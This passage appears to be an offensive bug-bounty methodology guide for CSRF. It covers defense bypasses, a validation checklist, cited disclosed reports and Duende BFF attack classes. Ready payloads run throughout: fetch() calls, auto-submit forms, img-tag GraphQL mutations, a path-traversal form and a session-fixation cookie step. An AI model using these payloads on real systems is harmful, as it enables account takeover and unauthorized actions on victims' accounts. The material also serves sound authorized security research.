**Bypass:** Use `text/plain` enctype with crafted form input names that produce valid JSON. Server receives JSON body, skips CORS preflight.

### Defense: Referer/Origin header check
**Bypasses:**
- Null Origin: use sandboxed iframe (`<iframe sandbox="allow-scripts allow-forms">`)
- Subdomain bypass: if `*.target.com` is trusted and you have XSS on any subdomain
- Referer stripping: HTTPS→HTTP transitions strip Referer header
- Weak matching: `target.com.evil.com` passes naive string matching

### Defense: Double-submit cookie pattern
**Bypass:** If attacker can set cookies (subdomain takeover, cookie injection via HTTP), they can set both the cookie and the form field to matching attacker-controlled values.

### Defense: Custom request header (e.g., `X-Requested-With`)
**Bypass:** Simple requests (form POST, `text/plain`) don't trigger preflight and can't set custom headers — but some servers only check for header *presence*, not value, and some frameworks accept requests without it.

---

### Mobile-app CSRF via custom-scheme deeplink
CSRF is not browser-only. For targets with a mobile app, enumerate exported deeplink / custom-scheme handlers (`scheme://action` from the Android manifest / iOS `Info.plist`) and test whether opening one performs a state-changing action (follow, link, purchase) using the app's ambient session with no CSRF token — deliverable to a victim by a plain link or a QR code. Disclosed: reports/583987, reports/805073.

## Gate 0 Validation

1. **What can the attacker DO right now?** — The attacker must be able to trigger a specific state-changing action (account linking, email change, data deletion, social association) on behalf of the victim without any interaction beyond visiting a URL or page.

2. **What does the victim LOSE?** — Identify the concrete harm: account access (ATO), data exposure, financial loss, reputation damage. "A CSRF token is missing" is not impact — "attacker can link their Oculus account to victim's Facebook account, gaining full profile access" is impact.

3. **Can it be reproduced in 10 minutes from scratch?** — You must be able to: (a) create attacker and victim accounts, (b) host a static HTML PoC, (c) have victim visit PoC, (d) confirm the action executed in victim's account — all within 10 minutes with no additional prerequisites.

---

### Scenario 1: Social Account Takeover via Import Friends (Rockstar Games)
An attacker crafted a malicious page targeting the "Import Friends" OAuth integration. When an authenticated SocialClub user visited the page, the CSRF triggered the OAuth token exchange with an attacker-controlled social account. The victim's SocialClub account became permanently linked to the attacker's Facebook/social identity, enabling full account access without the victim's knowledge. Rated high severity due to complete account compromise path.

### Scenario 2: Facebook Account Hijacking via Oculus Integration CSRF
During Oculus-Facebook account linking, the OAuth callback lacked proper CSRF state validation. An attacker could craft a URL that, when loaded by an authenticated Facebook user who had started the Oculus linking flow, would associate the attacker's Oculus device credentials with the victim's Facebook account. The attacker then had persistent access to the victim's Facebook profile through the Oculus app. The attack required only that the victim click a link while logged into Facebook.

### Scenario 3: JSON API CSRF on Heartbeat/Activity Tracking
A POST endpoint accepting `application/json` was assumed CSRF-safe by developers. A researcher crafted an HTML form using `enctype="text/plain"` with an input name designed to produce syntactically valid JSON when submitted. The browser sent the request cross-origin without a preflight (no custom headers, `text/plain` is a simple request), cookies were attached, and the server processed the JSON body as legitimate — silently logging attacker-controlled activity data under the victim's account identity.

---

## Disclosed Report Citations (Backfill +5 — 2020-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Four cases chain CSRF to full ATO; all five are modern (SameSite-era).

11. **Argo CD — SameSite=Lax bypass via sibling subdomain + Content-Type abuse (CVE-2024-22424)** ([GHSA-92mw-q256-5vwg](https://github.com/argoproj/argo-cd/security/advisories/GHSA-92mw-q256-5vwg) · [Writeup](https://blog.calif.io/p/argo-cd-csrf))
    - Subclass: SameSite=None/Lax misconfig chain — same parent-domain bypass + JSON CSRF via missing Content-Type enforcement
    - Payload: hosted on `marketing.victim.com`, target `argocd.internal.victim.com` → `fetch('https://argocd.internal.victim.com/api/v1/applications', {method:'POST', credentials:'include', body:'{"metadata":{"name":"pwn"},"spec":{"source":{"repoURL":"https://attacker/manifest.git"}}}'})`
    - Root cause: Argo CD did not enforce `Content-Type: application/json`, and SameSite=Lax is moot when the attacker controls any sibling subdomain of the shared parent
    - Year: 2023 reported, fixed Jan 2024 in 2.7.16/2.8.8/2.9.4

12. **GitLab — CSRF on `/api/graphql` via GET-converted mutations** ([H1 #1122408](https://hackerone.com/reports/1122408))
    - Subclass: GET-state-changing endpoint (GraphQL mutations through GET requests)
    - Payload: `<img src="https://gitlab.com/api/graphql?query=mutation{createSnippet(input:{title:%22x%22,visibilityLevel:public,content:%22pwn%22}){snippet{id}}}">`
    - Root cause: backend skipped `X-CSRF-Token` validation when the HTTP method was GET; GraphQL accepted mutations via `?query=mutation{...}` query string
    - Year: 2021 — **$3,370**

13. **Stripe Dashboard — CSRF middleware disabled by code change** ([H1 #1483327](https://hackerone.com/reports/1483327))
    - Subclass: framework misconfiguration — middleware globally disabled
    - Payload: `<form method="POST" action="https://dashboard.stripe.com/account/settings" enctype="text/plain"><input name='{"business_name":"pwned","x":"' value='"}'></form>` + auto-submit script
    - Root cause: 2022-02-14 deploy inadvertently turned off CSRF middleware across all Stripe Dashboard endpoints
    - Year: 2022 — **$5,000** ($2,500 × 2 researchers)

14. **GitHub Enterprise Server — CSRF bypass via path traversal (CVE-2022-23732)** ([H1 #1497169](https://hackerone.com/reports/1497169))
    - Subclass: CSRF token validation bypass (path traversal smuggles request past token check)
    - Payload: `<form method=POST action="https://ghes.victim.com/setup/api/start/..%2f..%2fadmin%2fusers"><input name=login value=attacker></form>`
    - Root cause: router matched the post-traversal path for execution but pre-traversal path for CSRF-protection scope, so the protected endpoint was reached without a valid token
    - Year: 2022 — **$10,000**

15. **HackerOne self — CSRF on social account linking → ATO** ([H1 #1727221](https://hackerone.com/reports/1727221))
    - Subclass: account-link CSRF (social provider attach without state binding)
    - Payload: `<img src="https://hackerone.com/users/social_accounts/google?code=ATTACKER_CODE&state=PREDICTABLE">` — victim's browser completes attacker-initiated link flow
    - Root cause: token bound to OAuth-link callback was either reused across attempts or not user-bound, so attacker-issued link callbacks were accepted on the victim's session — attacker's Google account becomes a valid login path = ATO
    - Year: 2022 — informational scope on H1 self-program, but public PoC

---

## Duende BFF — Role-Partitioned Antiforgery (2024-2026 surface)

Duende BFF (commercial successor to IdentityServer4) is the canonical ASP.NET Core BFF library for SPAs. Its antiforgery primitive is **non-standard and not user-bound**: instead of ASP.NET Core's per-session/per-user double-submit token, Duende only requires the presence of a **static header `X-CSRF: 1`** on every BFF-mapped endpoint. The header value is identical for every caller; it exists only to force a CORS preflight on cross-origin calls. This collapses CSRF defence to "same-origin + session cookie present" — and produces several distinct attack patterns when one BFF serves multiple privilege partitions.

**Architecture primer:** browser↔BFF authenticates via an encrypted HttpOnly session cookie (default `.AspNetCore.Cookies`); BFF↔API uses OAuth tokens cached server-side. Endpoints registered via `MapBffManagementEndpoints` / `MapRemoteBffApiEndpoint` / `MapBffApiEndpoint` enforce `X-CSRF: 1` and session presence — nothing else. ([docs.duendesoftware.com/bff](https://docs.duendesoftware.com/bff/), [Duende blog Mar 2025](https://duendesoftware.com/blog/20250325-understanding-antiforgery-in-aspnetcore))

### Attack class 1 — `X-CSRF: 1` is not user-bound, so cross-role replay succeeds same-origin

When a single BFF serves `/admin/*` and `/user/*` partitions, the antiforgery primitive cannot distinguish role-A from role-B. Any same-origin script that can land an XHR with `X-CSRF: 1` and the victim's session cookie reaches admin endpoints if the victim has the admin role. Stock ASP.NET Core antiforgery (which binds the token to `HttpContext.User.Identity.Name` and rejects on identity change) does the right thing here; Duende BFF does not. ([docs.duendesoftware.com/bff/fundamentals/options](https://docs.duendesoftware.com/bff/fundamentals/options/))

**Payload shape:** from a logged-in low-priv session, `fetch('/bff/admin/users/delete?id=42', {credentials:'include', headers:{'X-CSRF':'1'}})` — succeeds if the victim's session happens to hold the admin role and the attacker can land any same-origin script (self-XSS, subdomain-takeover JS, dependency-confusion).

### Attack class 2 — SignalR/WebSocket carve-out (the `/negotiate` shortcut)

Browser WebSockets cannot send custom headers, so `X-CSRF: 1` cannot be enforced on the upgrade. Developers routinely work around this by **excluding SignalR hub paths from BFF antiforgery** (`MapHub<X>().DisableAntiforgery()` or registering them as non-BFF endpoints). Once excluded, any same-site origin (including a takenover sibling subdomain or a stored-XSS page) can open the WS with the ambient session cookie → CSRF-over-WebSocket to invoke hub methods that mutate state.

**Payload shape:** cross-origin page opens `new WebSocket("wss://bff.example.com/hubs/admin")` — browser sends session cookie, no `X-CSRF` required, attacker invokes `DeleteUser(id)` via standard SignalR JSON frame. ([DuendeArchive/Support#972](https://github.com/DuendeArchive/Support/issues/972), [learn.microsoft.com/aspnet/core/signalr/security](https://learn.microsoft.com/en-us/aspnet/core/signalr/security))

### Attack class 3 — Cookie-domain wildcarding turns subdomain takeover into session fixation

BFF session cookies default to host-only, but developers commonly override with `options.Cookie.Domain = ".example.com"` to share login across `app.example.com` and `admin.example.com`. This drops the `__Host-` prefix protection. Take over `legacy.example.com` (CNAME to deprovisioned Heroku/S3) → set `Set-Cookie: .AspNetCore.Cookies=<attacker_session>; Domain=.example.com` → victim hits `app.example.com` carrying attacker's session = session-fixation ATO. ([nestenius.se BFF cookie hardening](https://nestenius.se/net/bff-in-asp-net-core-3-the-bff-pattern-explained/))

### Evidence strength

No Duende.BFF-direct CVE exists as of 2026-05. The three classes above are **design-level / documented behaviour** that becomes a live finding when paired with a co-resident primitive (same-origin script execution, SignalR carve-out, or subdomain takeover). Report severity should lean on the chain's business impact rather than CVE citation. Adjacent confirmed CVEs in the Duende ecosystem: CVE-2025-26620 (`Duende.AccessTokenManagement` race), CVE-2024-51987 (`Duende.AccessTokenManagement.OpenIdConnect` incorrect-token-after-refresh), CVE-2024-39694 (`Duende.IdentityServer` open redirect). ([Duende advisories on GitHub](https://github.com/advisories?query=duende))

## Related Skills & Chains

- **`hunt-xss`** — Any XSS on a trusted origin neutralizes CSRF defenses (token, SameSite, Origin check) instantly. Chain primitive: XSS reads the `meta[name=csrf-token]` value and same-origin-fetches `/accounts/email` with attacker payload → one-click ATO via attacker-page postMessage triggering the stored XSS to perform the state change.
- **`hunt-auth-bypass`** — CSRF combined with an auth-bypass primitive lets attacker-side scripts perform state changes that should have required step-up auth. Chain primitive: CSRF on `/settings/password` reaches an endpoint that skips the re-auth check → password change executes without the victim ever entering their current password → ATO.
- **`hunt-oauth`** — OAuth/SAML `state`/`RelayState` is structurally a CSRF token; missing validation here is account-linking CSRF. Chain primitive: attacker initiates OAuth on their account, sends victim the `/callback?code=X&state=` URL → victim's logged-in browser completes the link → attacker's social identity now controls victim's account.
- **`security-arsenal`** — Reach for the CSRF PoC templates (form POST, `enctype=text/plain` JSON, sandboxed-iframe null-origin, base64 multipart bypass) before writing one from scratch; also the WAF-bypass header variants for Origin/Referer checks.
- **`triage-validation`** — Run the Pre-Severity Gate before submitting CSRF on a logout endpoint or any action without state-change consequence — those are the canonical N/A traps. Confirm victim LOSES something concrete (account access, money, data), not just "a request executed."
